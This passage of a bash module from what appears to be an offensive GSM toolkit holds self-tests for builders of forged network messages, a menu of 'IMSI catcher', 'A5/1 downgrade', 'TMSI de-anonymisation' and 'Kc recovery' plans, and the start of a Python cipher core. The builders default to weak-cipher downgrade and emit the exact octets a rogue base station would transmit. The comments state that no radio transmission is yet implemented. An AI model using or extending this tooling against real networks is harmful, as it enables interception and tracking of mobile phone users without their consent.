    chk ia-pd-nibble    "$(printf '%s' "$ia" | awk -F'\t' '$1=="l3"{print substr($2,3,2)}')" "06"
    chk ia-l2pl         "$(fld "$ia" l2_pseudo_length)" "11"
    chk ia-message-type "$(fld "$ia" message_type)" "3f"
    chk ia-page-mode    "$(fld "$ia" page_mode)" "0"
    chk ia-channel-desc "$(fld "$ia" channel_description)" "20e03e"
    chk ia-request-ref  "$(fld "$ia" request_reference)" "0c0000"
    chk ia-ta           "$(fld "$ia" timing_advance)" "00"
    chk ia-mobile-allo  "$(fld "$ia" mobile_allocation)" "00"
    chk ia-rest         "$(fld "$ia" ia_rest_octets)" "2b"
    chk ia-l3           "$(fld "$ia" l3)" "0b063f0020e03e0c000000002b"
    chk ia-l3-octets    "$(fld "$ia" l3_octets)" "13"
    chk ia-lapdm        "$(fld "$ia" lapdm_frame)" "0303690b063f0020e03e0c000000002b"
    chk ia-arfcn-high   "$(fld "$ia" arfcn)" "62"
    # Request Reference, 10.5.2.30: the spec's own inverse is
    # FN mod 42432 = 51*((T3-T2) mod 26) + T3 + 51*26*T1'.
    chk ia-rr-roundtrip "$(fld "$(gatk_build_immediate_assignment 0c 12345 0 sdcch4 0 62 7 0 0 2b)" fn_recovered)" "12345"
    chk ia-rr-t1p       "$(fld "$(gatk_build_immediate_assignment 0c 12345 0 sdcch4 0 62 7 0 0 2b)" t1p)" "9"
    chk ia-bad-ra-rc    "$(gatk_build_immediate_assignment zz >/dev/null 2>&1; echo $?)" "2"
    chk ia-arfcn-max-rc "$(gatk_build_immediate_assignment 0c 0 0 sdcch4 0 1024 >/dev/null 2>&1; echo $?)" "2"
    chk ia-subchan-rc   "$(gatk_build_immediate_assignment 0c 0 0 sdcch4 4 >/dev/null 2>&1; echo $?)" "2"
    chk ia-ta-max-rc    "$(gatk_build_immediate_assignment 0c 0 64 >/dev/null 2>&1; echo $?)" "2"
    chk ia-rest-odd-rc  "$(gatk_build_immediate_assignment 0c 0 0 sdcch4 0 62 7 0 0 abc >/dev/null 2>&1; echo $?)" "2"
    # The FCCH facts and the wire algorithm names were built but unreachable
    # until this block; both are asserted here so they cannot go dead again
    # silently (see docs/CONFIRMED-BUGS.md item 17).
    chk ia-fcch-offset  "$(fld "$(gatk_fcch_facts)" frequency_offset_khz)" "67.708333"
    chk ia-fcch-guard   "$(fld "$(gatk_fcch_facts)" guard_bits)" "8.25"
    chk ia-alg-name-0   "$(gatk_alg_name 0)" "A5/1"
    chk ia-alg-name-3   "$(gatk_alg_name 3)" "A5/4"
    chk ia-alg-name-9   "$(gatk_alg_name 9)" "reserved"

    # 14. Keystream XOR: an all-zero keystream must be the identity.
    chk xor-identity "$(gatk_xor_hex deadbeef "$(printf '0%.0s' {1..32})")" "deadbeef"
    chk xor-invert "$(gatk_xor_hex deadbeef "$(printf '1%.0s' {1..32})")" "21524110"

    rm -rf "$d"
    # ── CIPHERING MODE COMMAND octets ───────────────────────────────────
    # Adjudicated against Wireshark's gsm_a dissector rather than against this
    # code: wrapping the message in a GSMTAP frame on UDP 4729 and reading it
    # back gives "Radio Resources Management (6) / Ciphering Mode Command
    # (0x35) / SC: Start ciphering (1) / Algorithm identifier: A5/2". That is
    # the independent check the repo's rule 16 asks for, and it is what caught
    # the Cipher Response bit.
    chk cms-a52-sc1  "$(gatk_build_cipher_mode A5/2 0)" "06350304"
    chk cms-a51-sc1  "$(gatk_build_cipher_mode A5/1 0)" "06350104"
    chk cms-a53-sc1  "$(gatk_build_cipher_mode A5/3 0)" "06350504"
    # CR in bit 5, verified: only 0x14 decodes as "CR: IMEISV shall be included".
    chk cms-cr1      "$(gatk_build_cipher_mode A5/2 1)" "06350314"
    chk cms-cr-bits  "$(( 0x$(gatk_build_cipher_mode A5/2 1 | cut -c7-8) & 0x10 ))" "16"
    chk cms-a54-rc   "$(gatk_build_cipher_mode A5/9 >/dev/null 2>&1; echo $?)" "2"
    chk cms-cr-bad   "$(gatk_build_cipher_mode A5/2 2 >/dev/null 2>&1; echo $?)" "2"
    # Algorithm identifier is 3 bits at 4,3,2 and SC is bit 1, so A5/0 must be
    # SC=0 - the table has no A5/0 row, which is why A5/1 starts at 000.
    chk cms-alg-a51  "$(gatk_alg_wire_code A5/1)" "0"
    chk cms-alg-a52  "$(gatk_alg_wire_code A5/2)" "1"
    chk cms-alg-a57  "$(gatk_alg_wire_code A5/7)" "6"

    # ── air-interface frame model ───────────────────────────────────────
    # Every value below is taken from the specification table named in the
    # comment, not from this code's own output. The frame layer is what the
    # transmit vectors schedule against, so a wrong offset here moves a forged
    # message into the wrong timeslot - the failure mode is silent.
    out=$(gatk_fn_split 123456)
    chk fn-t1   "$(fld "$out" t1)" "93"      # 123456 div 1326, TS 45.002 3.3.2.2.1
    chk fn-t2   "$(fld "$out" t2)" "8"       # 123456 mod 26
    chk fn-t3   "$(fld "$out" t3)" "36"      # 123456 mod 51
    chk fn-join "$(gatk_fn_join 93 8 36 | awk -F'\t' '$1=="fn"{print $2}')" "123456"
    out=$(gatk_fn_split 0)
    chk fn0-t1  "$(fld "$out" t1)" "0"
    chk fn0-t2  "$(fld "$out" t2)" "0"
    chk fn0-t3  "$(fld "$out" t3)" "0"
    out=$(gatk_fn_split 1326)
    chk fn1326-t1 "$(fld "$out" t1)" "1"
    chk fn1326-t2 "$(fld "$out" t2)" "0"
    chk fn1326-t3 "$(fld "$out" t3)" "0"

    # TS 45.002 3.3.2.3 a): CCCH_CONF 000 -> 9 CCCH blocks, 001 (combined with
    # SDCCH/4) -> 3. Getting this wrong makes every paging calculation land on
    # a frame that carries SDCCH instead of a paging block.
    chk ccch-000 "$(gatk_ccch_conf 000 | awk -F'\t' '$1=="paging_blocks_max"{print $2}')" "9"
    chk ccch-001 "$(gatk_ccch_conf 001 | awk -F'\t' '$1=="paging_blocks_max"{print $2}')" "3"
    chk ccch-comb "$(gatk_ccch_conf 001 | awk -F'\t' '$1=="bs_ccch_sdcch_comb"{print $2}')" "true"
    chk ccch-bad-rc "$(gatk_ccch_conf 011 >/dev/null 2>&1; echo $?)" "2"

    # TS 45.002 table 5: a combined cell has 3 blocks, not 9, and the RACH
    # frame set shrinks from 51 uplink frames to 27.
    chk rach-noncombined "$(gatk_rach_blocks false | awk -F'\t' '$1=="frame_count"{print $2}')" "51"
    chk rach-combined    "$(gatk_rach_blocks true  | awk -F'\t' '$1=="frame_count"{print $2}')" "27"

    # TS 45.003 3.1.4: the normal burst carries 114 encrypted bits plus TWO
    # stealing flags. TS 45.002 table 5.2.3-1 describes the same 116 bits as
    # two 58-bit fields, which is where the common 116-data-bit misreading
    # comes from.
    out=$(gatk_burst_layout normal)
    chk burst-nb-data-bits "$(fld "$out" data_bits)" "114"
    chk burst-nb-flags     "$(fld "$out" stealing_bits)" "2"
    chk burst-nb-hl        "$(printf '%s\n' "$out" | awk -F'\t' '$1=="stealing" && $2==60{print $2}')" "60"
    chk burst-nb-hu        "$(printf '%s\n' "$out" | awk -F'\t' '$1=="stealing" && $2==87{print $2}')" "87"
    chk burst-nb-tsc       "$(printf '%s\n' "$out" | awk -F'\t' '$1=="training"{print $2}')" "61..86"
    # TS 45.002 5.2.6: the dummy burst's 142 mixed bits are a fixed constant,
    # the only standardised known plaintext on the air interface.
    chk burst-db-known "$(gatk_burst_layout dummy | awk -F'\t' '$1=="known_plain_bits"{print $2}')" "142"
    chk burst-db-len   "${#GATK_DB_MIXED_BITS}" "142"
    out=$(gatk_dummy_burst)
    chk dummy-e-bits   "$(fld "$out" encrypted_bits)" "114"
    chk dummy-known    "$(fld "$out" known_plain_bits)" "142"
    # BN3..BN59 plus BN88..BN144 are the 114 positions a normal burst would
    # encrypt; between them sit the flag, the 26-bit filling sequence and the
    # second flag. The filling sequence is asserted as a regression guard on
    # the boundary, because a one-bit slip there silently corrupts the burst.
    local _e0 _e1
    _e0=$(fld "$out" e0_56); _e1=$(fld "$out" e57_113)
    chk dummy-e-split  "$(( ${#_e0} + ${#_e1} ))" "114"
    chk dummy-e-halves "$([[ ${#_e0} -eq 57 && ${#_e1} -eq 57 ]] && echo '57+57' || echo "${#_e0}+${#_e1}")" "57+57"
    chk dummy-c0-seq   "$(fld "$out" c0_filling_bn61_86)" "01110001011100010111000101"
    chk burst-db-chars "$(printf '%s' "$GATK_DB_MIXED_BITS" | tr -d '01' | wc -c | tr -d ' ')" "0"
    # The access burst's extended tail and guard are fixed by table 5.2.7-1.
    out=$(gatk_burst_layout access)
    chk burst-ab-tail  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="data"{print $3}')" "36"
    chk burst-ab-guard "$(printf '%s\n' "$out" | awk -F'\t' '$1=="guard"{print $3}')" "68.25"
    # The sync burst is 39 + 64 + 39 with no stealing flags.
    out=$(gatk_burst_layout sync)
    chk burst-sb-guard "$(printf '%s\n' "$out" | awk -F'\t' '$1=="guard"{print $3}')" "8.25"
    chk burst-sb-tsc   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="training"{print $3}')" "64"

    # TS 45.002 clause 7 table 3: the 51-frame map has five of each of FCCH
    # and SCH, and nine CCCH blocks, in the non-combined layout.
    out=$(gatk_multiframe_map)
    chk mf-fcch "$(printf '%s\n' "$out" | awk -F'\t' '$2=="FCCH"' | grep -c .)" "5"
    chk mf-sch  "$(printf '%s\n' "$out" | awk -F'\t' '$2=="SCH"' | grep -c .)" "5"

    # TS 45.002 clause 7 table 4: SDCCH/8 sub-channel 0 is DL 0..3 with the
    # uplink 15..18; SDCCH/4 sub-channel 0 (combined layout) is DL 22..25 with
    # the uplink 37..40.
    out=$(gatk_sdcch_map 8)
    chk sdcch8-sub0-dl "$(printf '%s\n' "$out" | awk -F'\t' '$1==0 && $2=="DL"{print $3}')" "0..3"
    chk sdcch8-sub0-ul "$(printf '%s\n' "$out" | awk -F'\t' '$1==0 && $2=="UL"{print $3}')" "15..18"
    chk sdcch8-sub7-ul "$(printf '%s\n' "$out" | awk -F'\t' '$1==7 && $2=="UL"{print $3}')" "43..46"
    out=$(gatk_sdcch_map 4)
    chk sdcch4-sub0-dl "$(printf '%s\n' "$out" | awk -F'\t' '$1==0 && $2=="DL"{print $3}')" "22..25"
    chk sdcch4-sub0-ul "$(printf '%s\n' "$out" | awk -F'\t' '$1==0 && $2=="UL"{print $3}')" "37..40"

    # TS 44.006 8.8.3: N201 is 20 on SDCCH and 18 on SACCH in format A/B, and
    # 21 on SACCH in format Bter. An over-long L3 message is a protocol error,
    # so the builder must refuse it rather than emit a frame the MS rejects.
    chk n201-sdcch "$(gatk_n201 sdcch  | awk -F'\t' '$1=="n201"{print $2}')" "20"
    chk n201-sacch "$(gatk_n201 sacch  | awk -F'\t' '$1=="n201"{print $2}')" "18"
    chk n201-sacch-bter "$(gatk_n201 sacch bter | awk -F'\t' '$1=="n201"{print $2}')" "21"
    chk n201-bcch  "$(gatk_n201 bcch   | awk -F'\t' '$1=="n201"{print $2}')" "23"
    chk n201-bad   "$(gatk_n201 nosuch >/dev/null 2>&1; echo $?)" "2"
    chk lapdm-fill "$(gatk_lapdm_fill_frame)" "030301"
    chk lapdm-overlong-rc \
        "$(gatk_lapdm_ui 0 1 "$(printf '06%.0s' $(seq 25))" >/dev/null 2>&1; echo $?)" "2"
    chk lapdm-at-n201 "$(gatk_lapdm_ui 0 1 "$(printf '06%.0s' $(seq 20))" 0 20 >/dev/null 2>&1; echo $?)" "0"
    out=$(gatk_lapdm_burst_plan 030301 0 1 2 3)
    chk lapdm-bursts   "$(fld "$out" bursts)" "4"
    chk lapdm-coded    "$(fld "$out" coded_bits)" "456"
    chk lapdm-per-burst "$(fld "$out" bits_per_burst)" "114"

    # TS 45.010 3 and 5.5: one TA step is 48/13 us of round trip, so the cell
    # radius at TAmax 63 is 63 x 553.46 m. GSM 400 raises TAmax to 219.
    out=$(gatk_ta 63)
    chk ta-bit-us "$(fld "$out" bit_us)" "3.692307692"
    chk ta-max-m  "$(fld "$out" max_one_way_m)" "34868"
    chk ta-advance "$(fld "$out" advance_symbols)" "405.75"
    chk ta-64-rc  "$(gatk_ta 64 >/dev/null 2>&1; echo $?)" "2"
    chk ta-gsm400-rc "$(gatk_ta 219 gsm400 >/dev/null 2>&1; echo $?)" "0"
    chk ta-gsm400-max "$(gatk_ta 219 gsm400 | awk -F'\t' '$1=="max_ta"{print $2}')" "219"

    # SCH payload, TS 45.018 figure 9.1.30a.1 read under the TS 44.004 rule
    # that bit 1 of an octet is transmitted first. For BSIC 7 (NCC 0, BCC 7)
    # on SCH frame 1 the 25 bits are: BCC 111 at i2..i4, NCC 000 at i5..i7,
    # T1 = 0, T2 = 1, T3' = 0. The bit order is the part every implementation
    # gets wrong, so it is asserted literally, and it was cross-checked
    # against gr-gsm's decode_sch().
    out=$(gatk_sch_payload 0 1)
    chk sch-bsic-bits "$(fld "$out" sch_bits)" "0000000000000000000001000"
    # The transmission order is the reverse of each octet. For BSIC 0 on frame
    # 1 the only set bit is T2's least significant bit, which sits at i18 -
    # i.e. bit 3 of the third octet, position 21 in the column-order string.
    chk sch-bsic-tx   "$(fld "$out" sch_bits_tx)" "0000000000000000001000000"
    chk sch-bits      "$(fld "$out" sch_info_bits)" "25"
    chk sch-ncc "$(fld "$out" plmn_colour_code)" "0"
    chk sch-bcc "$(fld "$out" bs_colour_code)" "0"
    out=$(gatk_sch_payload 7 11)
    chk sch7-t3p "$(fld "$out" t3p)" "1"
    chk sch7-is-sch "$(fld "$out" input_is_sch_frame)" "yes"
    # A frame that carries no SCH must be reported as such and fail, not
    # silently return the decade's SCH frame as though it were the input.
    chk sch-nonsch-rc "$(gatk_sch_payload 7 1234 >/dev/null 2>&1; echo $?)" "1"
    chk sch-nonsch-flag "$(gatk_sch_payload 7 1234 2>/dev/null | awk -F'\t' '$1=="input_is_sch_frame"{print $2}')" "no"
    chk sch-toobig-rc "$(gatk_sch_payload 7 99999999 >/dev/null 2>&1; echo $?)" "2"
    chk sch-bsic63-rc "$(gatk_sch_payload 64 1 >/dev/null 2>&1; echo $?)" "2"

    # The frame clock itself: TS 45.010 5 gives 48/13 us per bit and a
    # hyperframe of 2715648 frames.
    out=$(gatk_frame_facts)
    chk ff-slot-bits "$(fld "$out" slot_bits)" "156.25"
    chk ff-frame-ms  "$(fld "$out" frame_ms)" "4.615385"
    chk ff-hyper     "$(fld "$out" hyperframe_frames)" "2715648"

    # The System Information the transmit path broadcasts. These assert the
    # FIELD ARITHMETIC in TS 44.018 9.1.3, not this module's output against
    # itself: SI1 and SI2 are 21 octets because a 23-octet block behind a
    # 2-octet LAPDm header has exactly that much room, SI3 is 17 and SI4 is 14
    # because that is what their field lists add up to.
    local si1 si2 si3 si4
    si1=$(gatk_build_si1 62 | tr -d '\n')
    si2=$(gatk_build_si2 62 | tr -d '\n')
    si3=$(gatk_build_si3 262 01 00f1 00a1 | tr -d '\n')
    si4=$(gatk_build_si4 262 01 00f1 00a1 | tr -d '\n')
    chk si1-len  "$(( ${#si1} / 2 ))" "21"
    chk si2-len  "$(( ${#si2} / 2 ))" "21"
    chk si3-len  "$(( ${#si3} / 2 ))" "17"
    chk si4-len  "$(( ${#si4} / 2 ))" "14"
    # RR management PD is 0110 and the skip indicator is 0000, so the first
    # octet is 0x60; the message types are 0x19, 0x1a, 0x1b, 0x1c.
    chk si1-mt "${si1:0:4}" "6019"
    chk si2-mt "${si2:0:4}" "601a"
    chk si3-mt "${si3:0:4}" "601b"
    chk si4-mt "${si4:0:4}" "601c"
    # LAI inside SI3/SI4 is a bare 5-octet field; the 0x05 IEI belongs only to
    # the LOCATION UPDATING ACCEPT form gatk_lai_encode returns.
    chk si3-lai "${si3:4:10}" "62f21000f1"
    chk si4-lai "${si4:4:10}" "62f21000f1"
    chk lai-iei "$(gatk_lai_encode 262 01 00f1)" "0562f21000f1"
    chk lai-fld "$(gatk_lai_field 262 01 00f1)" "62f21000f1"
    # ARFCN 62 in bit map 0 format: octet 8 of the 15, bit 1, so 0x02.
    chk cdb62 "${si1:6:2}" "00"
    chk cdb62-hit "$(gatk_chan_desc_bitmap0 62 | cut -c17-18)" "02"
    # Control Channel Description: ATT=1 T3212=10, BS_AG_BLKS_RES=2,
    # CCCH_CONF=1 BS_PA_MFRMS=2.
    chk ccd "$(gatk_ctrl_chan_desc 1 2 2 10 1)" "085228"
    # A block is 23 octets, and one octet over must be refused rather than
    # truncated.
    local blk rc
    blk=$(gatk_bcch_frame "$si3"); chk bcch-block-len "$(( ${#blk} / 2 ))" "23"
    ( gatk_bcch_frame "60$(printf '00%.0s' $(seq 1 22))" ) >/dev/null 2>&1
    rc=$?; chk bcch-toobig-rc "$rc" "2"

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
gatk_menu() {
    local c
    while true; do
        banner
        echo -e "  ${C_MAG}=== GSM attack ===${C_RESET}"
        echo -e "  tx sdr: ${C_GRN}$(gatk_find_tx_sdr || echo none)${C_RESET}"
        echo -e "  rx sdr: ${C_GRN}$(gatk_find_rx_sdr || echo none)${C_RESET}"
        echo -e "  plans:  ${C_GRN}$(gatk_plan_count)${C_RESET}  ${C_DIM}$GATK_DIR${C_RESET}\n"
        cat << 'M'
  [1]  IMSI catcher plan            (needs TX SDR)
  [2]  A5/1 downgrade plan          (needs TX SDR)
  [3]  TMSI de-anonymisation plan   (needs TX SDR)
  [4]  Kc recovery plan             (needs RX SDR + tables)
  [5]  show the RACH->AGCH->SDCCH sequence
  [6]  paging-response race timing
  [7]  classmark encode / decode
  [8]  classmark downgrade (clear A5/1)
  [9]  build an Identity Request
  [10] Kc recovery facts
  [11] list written plans
  [12] build a CIPHERING MODE COMMAND
  [13] build a LOCATION UPDATING ACCEPT
  [14] build a TMSI REALLOCATION COMMAND
  [15] build a PAGING REQUEST TYPE 1
  [16] classmark 1 encode / decode
  [17] cipher keystream (A5/2 A5/3 A5/4) + decrypt
  [0]  back

M
        if [[ -n "${IMSISTING_CLI:-}" ]]; then
            echo "[-] menu unavailable in CLI mode" >&2; return 1
        fi
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1) gatk_cmd_plan imsi-catcher | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            2) gatk_cmd_plan a5-downgrade | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            3) gatk_cmd_plan tmsi-deanon | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            4) gatk_cmd_plan kc-recovery | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            5) gatk_cmd_imsi_catcher_sequence | column -t -s$'\t' 2>/dev/null
               read -rp "  press enter " _ ;;
            6)
                read -rp "  attacker lead in frames (default 3)> " l
                gatk_paging_race "${l:-3}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            7)
                read -rp "  classmark hex (blank = default encode)> " h
                gatk_cmd_classmark "$h" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            8)
                read -rp "  classmark hex> " h
                gatk_classmark_downgrade "$h" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            9)
                read -rp "  identity type (1=IMSI 2=IMEI 3=IMEISV 4=TMSI)> " t
                gatk_build_identity_request "${t:-1}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            10) gatk_cmd_kc_recovery | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            11) gatk_cmd_plan_tsv | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            12)
                read -rp "  algorithm (A5/1..A5/4, default A5/2)> " a
                read -rp "  cipher response CR (0/1, default 0)> " r
                gatk_build_cipher_mode "${a:-A5/2}" "${r:-0}"
                read -rp "  press enter " _ ;;
            13)
                read -rp "  TMSI hex (8 digits, default 0f200001)> " t
                gatk_build_lu_accept "${t:-0f200001}"
                read -rp "  press enter " _ ;;
            14)
                read -rp "  TMSI hex (8 digits, default 0f200001)> " t
                gatk_build_tmsi_realloc "${t:-0f200001}"
                read -rp "  press enter " _ ;;
            15)
                read -rp "  TMSI hex (8 digits, default 0f200001)> " t
                read -rp "  paging group 0..3 (default 0)> " g
                gatk_build_paging_request "${t:-0f200001}" "${g:-0}"
                read -rp "  press enter " _ ;;
            16)
                read -rp "  [d]ecode or [e]ncode?> " m
                if [[ "${m:-d}" == "e" ]]; then
                    read -rp "  revision 0..3 (default 1)> " rv
                    read -rp "  rf power 0..7 (default 4)> " pw
                    read -rp "  a5/1 available 0/1 (default 1)> " av
                    gatk_classmark1_encode "${rv:-1}" "${pw:-4}" 0 "${av:-1}"
                else
                    read -rp "  classmark 1 octet (default 44)> " o
                    gatk_classmark1_decode "${o:-44}" | column -t -s$'\t' 2>/dev/null
                fi
                read -rp "  press enter " _ ;;
            17)
                echo "  1 A5/2   2 A5/3   3 A5/4   4 decrypt a hex burst"
                read -rp "  choice> " k
                case "${k:-1}" in
                  1) read -rp "  Kc hex (16 digits)> " kc
                     read -rp "  COUNT (default 0)> " c
                     gatk_a5_2_bits "${kc:-0011223344556677}" "${c:-0}" 228 ;;
                  2) read -rp "  Kc hex (16 digits)> " kc
                     read -rp "  COUNT (default 0)> " c
                     gatk_a5_3_bits "${kc:-0011223344556677}" "${c:-0}" 64 228 ;;
                  3) read -rp "  Kc hex (32 digits)> " kc
                     gatk_a5_4_bits "${kc:-00112233445566778899aabbccddeeff}" 0 228 ;;
                  4) read -rp "  ciphertext hex> " ct
                     read -rp "  Kc hex> " kc
                     read -rp "  algorithm (default a5-2)> " a
                     gatk_cmd_decrypt "$ct" "$kc" "${a:-a5-2}" 0 | column -t -s$'\t' 2>/dev/null ;;
                esac
                read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ══════════════════════════════════════════════════════════════════════
# TX surface (Phase 1): RR/MM message builders, classmark codecs and real
# GSM cipher implementations.
#
# Honest split, restated for this block: the builders below produce the
# exact octets of a message the network would transmit, and the ciphers
# produce real keystream. What is still missing is the radio — no burst is
# formed, no channel coding is applied and nothing is transmitted. Those
# remain PLAN FILES with `status: handoff`.
# ══════════════════════════════════════════════════════════════════════

# ── GSM cipher backend ──────────────────────────────────────────────────
# One python3 process per call, fed the shared core on stdin. python3 is
# already a hard dependency of the toolkit (00_deps.sh) and is the same
# backend 06_gsm_air.sh uses for A5/1.
#
# The core implements, from the published specifications:
#   KASUMI         3GPP TS 35.202
#   f8 / UEA1      3GPP TS 35.201 section 3
#   f9 / UIA1      3GPP TS 35.201 section 4
#   KGCORE         3GPP TS 55.216 section 3 (A5/3, A5/4 and GEA3)
#   A5/2           see the note on gatk_a5_2_bits
gatk_crypto() {   # <subcommand> [args...]
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 missing — cannot run the GSM ciphers\n' >&2; return 1; }
    python3 -c "$GATK_CRYPTO_CORE" "$@" || return 1
}

# The core is defined once, lazily, and cached for the life of the process.
gatk_crypto_load() {
    [[ -n "${GATK_CRYPTO_CORE:-}" ]] && return 0
    GATK_CRYPTO_CORE=$(cat <<'PYGSM'
S7 = [
            54, 50, 62, 56, 22, 34, 94, 96, 38, 6, 63, 93, 2, 18, 123, 33,
            55, 113, 39, 114, 21, 67, 65, 12, 47, 73, 46, 27, 25, 111, 124, 81,
            53, 9, 121, 79, 52, 60, 58, 48, 101, 127, 40, 120, 104, 70, 71, 43,
            20, 122, 72, 61, 23, 109, 13, 100, 77, 1, 16, 7, 82, 10, 105, 98,
            117, 116, 76, 11, 89, 106, 0, 125, 118, 99, 86, 69, 30, 57, 126, 87,
            112, 51, 17, 5, 95, 14, 90, 84, 91, 8, 35, 103, 32, 97, 28, 66,
            102, 31, 26, 45, 75, 4, 85, 92, 37, 74, 80, 49, 68, 29, 115, 44,
            64, 107, 108, 24, 110, 83, 36, 78, 42, 19, 15, 41, 88, 119, 59, 3,
]
S9 = [
            167, 239, 161, 379, 391, 334, 9, 338, 38, 226, 48, 358, 452, 385, 90, 397,
            183, 253, 147, 331, 415, 340, 51, 362, 306, 500, 262, 82, 216, 159, 356, 177,
            175, 241, 489, 37, 206, 17, 0, 333, 44, 254, 378, 58, 143, 220, 81, 400,
            95, 3, 315, 245, 54, 235, 218, 405, 472, 264, 172, 494, 371, 290, 399, 76,
            165, 197, 395, 121, 257, 480, 423, 212, 240, 28, 462, 176, 406, 507, 288, 223,
            501, 407, 249, 265, 89, 186, 221, 428, 164, 74, 440, 196, 458, 421, 350, 163,
            232, 158, 134, 354, 13, 250, 491, 142, 191, 69, 193, 425, 152, 227, 366, 135,
            344, 300, 276, 242, 437, 320, 113, 278, 11, 243, 87, 317, 36, 93, 496, 27,
            487, 446, 482, 41, 68, 156, 457, 131, 326, 403, 339, 20, 39, 115, 442, 124,
            475, 384, 508, 53, 112, 170, 479, 151, 126, 169, 73, 268, 279, 321, 168, 364,
            363, 292, 46, 499, 393, 327, 324, 24, 456, 267, 157, 460, 488, 426, 309, 229,
            439, 506, 208, 271, 349, 401, 434, 236, 16, 209, 359, 52, 56, 120, 199, 277,
            465, 416, 252, 287, 246, 6, 83, 305, 420, 345, 153, 502, 65, 61, 244, 282,
            173, 222, 418, 67, 386, 368, 261, 101, 476, 291, 195, 430, 49, 79, 166, 330,
            280, 383, 373, 128, 382, 408, 155, 495, 367, 388, 274, 107, 459, 417, 62, 454,
            132, 225, 203, 316, 234, 14, 301, 91, 503, 286, 424, 211, 347, 307, 140, 374,
            35, 103, 125, 427, 19, 214, 453, 146, 498, 314, 444, 230, 256, 329, 198, 285,
            50, 116, 78, 410, 10, 205, 510, 171, 231, 45, 139, 467, 29, 86, 505, 32,
            72, 26, 342, 150, 313, 490, 431, 238, 411, 325, 149, 473, 40, 119, 174, 355,
            185, 233, 389, 71, 448, 273, 372, 55, 110, 178, 322, 12, 469, 392, 369, 190,
            1, 109, 375, 137, 181, 88, 75, 308, 260, 484, 98, 272, 370, 275, 412, 111,
            336, 318, 4, 504, 492, 259, 304, 77, 337, 435, 21, 357, 303, 332, 483, 18,
            47, 85, 25, 497, 474, 289, 100, 269, 296, 478, 270, 106, 31, 104, 433, 84,
            414, 486, 394, 96, 99, 154, 511, 148, 413, 361, 409, 255, 162, 215, 302, 201,
            266, 351, 343, 144, 441, 365, 108, 298, 251, 34, 182, 509, 138, 210, 335, 133,
            311, 352, 328, 141, 396, 346, 123, 319, 450, 281, 429, 228, 443, 481, 92, 404,
            485, 422, 248, 297, 23, 213, 130, 466, 22, 217, 283, 70, 294, 360, 419, 127,
            312, 377, 7, 468, 194, 2, 117, 295, 463, 258, 224, 447, 247, 187, 80, 398,
            284, 353, 105, 390, 299, 471, 470, 184, 57, 200, 348, 63, 204, 188, 33, 451,
            97, 30, 310, 219, 94, 160, 129, 493, 64, 179, 263, 102, 189, 207, 114, 402,
            438, 477, 387, 122, 192, 42, 381, 5, 145, 118, 180, 449, 293, 323, 136, 380,
            43, 66, 60, 455, 341, 445, 202, 432, 8, 237, 15, 376, 436, 464, 59, 461,
]


def ROL16(a, b):
    return ((a << b) | (a >> (16 - b))) & 0xFFFF


def FI(inp, subkey):
    nine = (inp >> 7) & 0x1FF
    seven = inp & 0x7F
    nine = S9[nine] ^ seven
    seven = S7[seven] ^ (nine & 0x7F)
    seven ^= (subkey >> 9)
    nine ^= (subkey & 0x1FF)
    nine = S9[nine] ^ seven
    seven = S7[seven] ^ (nine & 0x7F)
    return ((seven << 9) + nine) & 0xFFFF


class Kasumi:
    def __init__(self, key):
        C = [0x0123, 0x4567, 0x89AB, 0xCDEF, 0xFEDC, 0xBA98, 0x7654, 0x3210]
        k = [(key[2 * n] << 8) | key[2 * n + 1] for n in range(8)]
        Kp = [k[n] ^ C[n] for n in range(8)]
        self.KL1 = [ROL16(k[n], 1) for n in range(8)]
        self.KL2 = [Kp[(n + 2) & 7] for n in range(8)]
        self.KO1 = [ROL16(k[(n + 1) & 7], 5) for n in range(8)]
        self.KO2 = [ROL16(k[(n + 5) & 7], 8) for n in range(8)]
        self.KO3 = [ROL16(k[(n + 6) & 7], 13) for n in range(8)]
        self.KI1 = [Kp[(n + 4) & 7] for n in range(8)]
        self.KI2 = [Kp[(n + 3) & 7] for n in range(8)]
        self.KI3 = [Kp[(n + 7) & 7] for n in range(8)]

    def FL(self, inp, i):
        l = (inp >> 16) & 0xFFFF
        r = inp & 0xFFFF
        r ^= ROL16(l & self.KL1[i], 1)
        l ^= ROL16(r | self.KL2[i], 1)
        return ((l & 0xFFFF) << 16) + (r & 0xFFFF)

    def FO(self, inp, i):
        l = (inp >> 16) & 0xFFFF
        r = inp & 0xFFFF
        l ^= self.KO1[i]; l = FI(l, self.KI1[i]); l ^= r
        r ^= self.KO2[i]; r = FI(r, self.KI2[i]); r ^= l
        l ^= self.KO3[i]; l = FI(l, self.KI3[i]); l ^= r
        return ((r & 0xFFFF) << 16) + (l & 0xFFFF)

    def enc(self, blk):
        l = int.from_bytes(blk[0:4], 'big')
        r = int.from_bytes(blk[4:8], 'big')
        n = 0
        while n <= 7:
            r ^= self.FO(self.FL(l, n), n); n += 1
            l ^= self.FL(self.FO(r, n), n); n += 1
        return l.to_bytes(4, 'big') + r.to_bytes(4, 'big')


KMF8 = bytes([0x55] * 16)
KMF9 = bytes([0xAA] * 16)


def kgcore(ck, ca, cb, cc, cd, ce, cl):
    """TS 55.216 section 3. A = CC||CB||CD||00||CA||CE."""
    A = ((cc & 0xFFFFFFFF) << 32) | ((cb & 0x1F) << 27) | ((cd & 1) << 26) | \
        ((ca & 0xFF) << 16) | (ce & 0xFFFF)
